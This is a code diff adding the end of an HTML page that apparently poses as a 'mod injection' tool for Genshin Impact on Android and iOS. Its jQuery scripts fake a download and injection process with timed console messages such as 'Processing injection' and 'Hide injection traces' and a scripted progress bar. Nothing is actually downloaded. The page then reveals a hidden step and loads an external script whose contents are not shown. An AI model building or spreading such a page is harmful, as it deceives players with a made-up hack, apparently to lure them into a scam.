+					<!-------Platform Part Start------>
+					<div class="second-step continue app-download-main animated bounceIn mfp-hide" style="padding-top:20px;">
+						<div class="animated bounceIn">
+							<p class="app-download-intro-text">Select your operating system.</p>
+							<div class="field-wrapper platform-field-wrapper">									
+								<div class="row small-margin">
+									<div class="col small-padding">
+										<div class="platform-item platform-item-1" tabindex="-1">
+											<i class="fab fa-android"></i>
+											<span>Android</span>
+										</div>
+									</div>
+									<div class="col small-padding">
+										<div class="platform-item platform-item-2" tabindex="-1">
+											<i class="fab fa-apple"></i>
+											<span>iOS</span>
+										</div>
+									</div>
+								</div>
+							</div>
+							<div class="button-wrapper">
+								<button id="b-2" class="button animated pulse infinite">Continue</button>
+							</div>
+						</div>
+					</div>
+					<!------Platform Part End------>
+					
+				</div>																								
+				
+			
+			
+			</div>
+		</section>
+		<!--footer>
+			<div class="container">
+				<div class="footer-content">
+					<p>Mod Injection • No Jailbreak/APK required •</p>
+				</div>
+			</div>
+		</footer-->
+	
+	<!-- JS -->	
+	<script>
+	$console_message_1_1 = 'Loading files ...';
+	$console_message_2 = 'Connecting to the server';
+	$console_message_3 = 'Downloading GenshinImpact.vi ';
+	$console_message_4=  'Downloading GenshinImpact.vi';
+	$console_message_5 = 'Downloading GenshinImpact.vi';	
+	$console_message_6 = 'Processing injection ...';
+	$console_message_7 = 'Hide injection traces';
+	$console_message_8 = 'Final stage setting';
+	
+	</script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+
+
+<script>
+
+</script>
+<script type="text/javascript">
+    $(window).load(function() {
+
+$followers_amount_1 = "500";
+	$followers_amount_2 = "1000";
+	
+	var s_n;
+	var selected_network;
+	var username;
+	var $selected_followers_value;
+	var $followers_icon;
+
+$(document).ready(function() {
+		$("#b-1").click(function(){
+		setTimeout(function() {
+		$.magnificPopup.open({
+						items: {
+							src: '.f1',
+						},
+						type: 'inline',
+						preloader: false,
+						modal: true,
+						fixedContentPos: true,
+						fixedBgPos: true,
+						callbacks: {	
+							open: function() {
+								setTimeout(function() {
+										
+									$('.f1').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
+										$(this).removeClass('animated bounceIn');	
+									});
+								}, 0 );
+								
+								setTimeout(function() {
+									$('.console-msg').html($console_message_1_1);	
+									$('.console-msg').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
+										$(this).removeClass('animated bounceIn');	
+									});
+								}, 1000 );
+							
+								setTimeout(function() {	
+									$('.f1').addClass('bounceOut animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){										
+										$(this).removeClass('animated bounceOut');{
+											$('.f1').addClass('mfp-hide');
+											$.magnificPopup.close();
+										}
+																																			
+									});
+									
+									
+								}, 4500 );
+								
+								setTimeout(function() {	
+									$(".first-step").addClass("mfp-hide");
+									$('.second-step').removeClass('mfp-hide');
+									$('.second-step').addClass('animated bounceIn');
+								}, 6500 );
+								/*Progressbar*/
+								
+								function progressBarConsole(percent, $element, duration) {
+									var progressBarConsoleWidth = percent * $element.width() / 100;
+									$element.find('div').animate({ width: progressBarConsoleWidth }, duration).html(percent + "%&nbsp;");
+								}
+										progressBarConsole(0, $('#progressBarConsole'), 1);
+										progressBarConsole(100, $('#progressBarConsole'), 4000);
+								
+								/*Progressbar END*/
+							}
+						}
+					});
+			}, 1000 );
+					
+		});
+		
+		
+		$('.platform-item').on('click', function(){
+			$('.platform-item').removeClass('active');
+			$(this). addClass('active');
+		});
+		
+					
+		
+		$("#b-2").click(function(){
+		if ($('.platform-item').hasClass('active')) {
+			setTimeout(function() {
+		$.magnificPopup.open({
+						items: {
+							src: '.main-f',
+						},
+						type: 'inline',
+						preloader: false,
+						modal: true,
+						fixedContentPos: true,
+						fixedBgPos: true,
+						callbacks: {	
+							open: function() {
+								setTimeout(function() {
+										
+									$('.f2').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
+										$(this).removeClass('animated bounceIn');	
+									});
+								}, 0 );
+								
+								setTimeout(function() {
+									$('.console-msg').html($console_message_2);	
+									$('.console-msg').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
+										$(this).removeClass('animated bounceIn');	
+									});
+								}, 3000 );
+								
+								setTimeout(function() {
+									$('.console-msg').html($console_message_3);	
+									$('.console-msg').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
+										$(this).removeClass('animated bounceIn');	
+									});
+								}, 6000 );
+								
+								setTimeout(function() {
+									$('.console-msg').html($console_message_4);	
+									$('.console-msg').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
+										$(this).removeClass('animated bounceIn');	
+									});
+								}, 9000 );
+								
+								
+								setTimeout(function() {
+									$('.console-msg').html($console_message_6);	
+									$('.console-msg').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
+										$(this).removeClass('animated bounceIn');	
+									});
+								}, 15000 );
+								
+								
+								setTimeout(function() {
+									$('.console-msg').html($console_message_8);	
+									$('.console-msg').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
+										$(this).removeClass('animated bounceIn');	
+									});
+								}, 21000 );
+								
+								setTimeout(function() {	
+									$('.f2').addClass('bounceOut animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){										
+										$(this).removeClass('animated bounceOut');{
+											$('.f2').addClass('mfp-hide');
+										}
+																																			
+									});
+								}, 23000 );
+								
+								setTimeout(function() {
+									$('.f3').removeClass('mfp-hide');
+									$('.f3').addClass('bounceIn animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){										
+										$(this).removeClass('animated bounceIn');
+																																			
+									});
+								}, 25000 );
+								/*Progressbar*/
+								
+								function progressBarConsole(percent, $element, duration) {
+									var progressBarConsoleWidth = percent * $element.width() / 100;
+									$element.find('div').animate({ width: progressBarConsoleWidth }, duration).html(percent + "%&nbsp;");
+								}
+										progressBarConsole(0, $('#progressBarConsole'), 1);
+										progressBarConsole(100, $('#progressBarConsole'), 20500);
+								
+								/*Progressbar END*/
+							}
+						}
+					});
+			}, 1000 );
+			
+		}else{
+			$(".platform-field-wrapper").addClass('shake animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
+				$(this).removeClass('shake animated');
+			});		
+		}	
+		});
+		
+		
+	});
+	
+});
+</script>
+<script type="text/javascript" src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/assets/1559362555ec79a5a2f5b81fb62c1408059a6368dc.js"></script>
+<script>
+</script>
+
+</body>
+</html>
